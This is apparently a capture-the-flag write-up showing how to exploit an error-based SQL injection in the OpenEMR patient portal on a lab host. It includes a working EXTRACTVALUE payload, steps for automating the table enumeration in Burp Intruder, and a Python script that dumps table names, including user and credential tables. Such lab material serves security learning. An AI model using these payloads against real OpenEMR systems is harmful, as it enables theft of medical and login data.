# Steps to use intruder
```Sql
==================================================================================================================================
Before:
GET /portal/add_edit_event_user.php?eid=1+AND+EXTRACTVALUE(0,CONCAT(0x0a,(SELECT+TABLE_NAME+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA+like+'openemr'+LIMIT+1))) HTTP/1.1

After:
GET /portal/add_edit_event_user.php?eid=1+AND+EXTRACTVALUE(0,CONCAT(0x0a,(SELECT+TABLE_NAME+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA+like+'openemr'+limit+1,1))) HTTP/1.1
out:     
Error: <font color='red'>XPATH syntax error: '     
amc_misc_data'</font>     
================================================================================================================================== 
```


What the 1,1 tells us is the row and the max number of rows. So example, 2,1 3,1 4,1 ..... so we can dump every single column inside  
of this table. There is a lot of columns so we may want to automate this task.     


![[intruder_add.png]]
We could write a a script or use burp intruder free version which is time throttled to enuemerate, 
1. Send repeater payload to intruder 
2. Go to positions tab and and hit the clear button to clear the symbols 
3. Add a symbol around the value you want to attack. This case being the first number after "LIMIT". Highlight it. 
4. Go to payloads and set the payload type to numbers and make the number range sequential 
5. From 0 to 300 Step 1. 

![[Pasted image 20210421172639.png]]
 
Afterwards you may want to find the output but it becomes quite hard to look for so you can create a grep rule from within 
burp to find the necessary info and narrow it down. 
1.Go to option within the intruder attack 
2. Go to Grep - extract 
3. Add a rule  
4. Start expresion, this case being for us "XPATH syntax error: '" 
5. End at delimiter, this being  "'"
6. click ok , and inresults you should see a new column with the expresion start and rows of the data extracted.
![[Pasted image 20210421172727.png]]

![[Pasted image 20210421172842.png]]

In the end we find 3 interesting artifacts, users, users_facility, and users_secure

![[Pasted image 20210421173103.png]]

## Python Code to Emulate Intruder Behavior with no throttling
```python
import requests
import re
import sys

# You will need 3 requests
# 1st request to the server to retrieve the PHPSESSION cookie
# 2nd request to obtain the OPENEMR cookie
# and the final request is to send the both cookies previously obtained


p = requests.get('http://hms.htb/portal/account/register.php')
q = requests.get('http://hms.htb/interface/login/login.php?site=default')
for c in p.cookies:
    q.cookies.set(c.name , c.value)

pattern = re.compile("XPATH syntax error: \'(.*)\'")
for i in range(1,300):
    # made sure 0x5c was used instead of 0x0a to make it easier to parse
    r = requests.get("http://hms.htb/portal/add_edit_event_user.php?eid=1+AND+EXTRACTVALUE(0,CONCAT(0x5c,(SELECT+TABLE_NAME+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA+like+'openemr'+limit+"+ str(i) + ",1)))", cookies=q.cookies)
    ### NEED error handling if string is not found
    try:
        result = pattern.search(r.text)
        print(result.group(1)[1:])
    except (AttributeError): 
        print("All range numbers have been exhausted.")
        break
```
